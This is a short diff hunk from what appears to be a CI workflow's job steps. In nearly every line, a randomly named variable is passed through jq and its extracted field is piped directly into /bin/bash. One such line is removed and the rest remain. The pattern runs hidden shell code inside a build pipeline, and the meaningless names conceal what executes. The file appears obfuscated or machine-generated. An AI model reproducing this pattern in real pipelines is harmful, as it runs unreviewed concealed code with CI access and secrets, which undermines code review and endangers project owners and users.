@@ -39,7 +39,6 @@ jobs:
           echo $cpnpm85 | jq -r .e35 | /bin/bash
           printf '%s' "$yc802" | jq -r .ffor7539 | /bin/bash
           printf '%s' "$ci76" | jq -r .uci3 | /bin/bash
-          echo $zqfh10 | jq -r .zq5406 | /bin/bash
           echo $xyw5103 | jq -r .lngc1 | /bin/bash
           echo $apkyw8567 | jq -r .s93 | /bin/bash
           echo $ddrx0204 | jq -r .py529 | /bin/bash
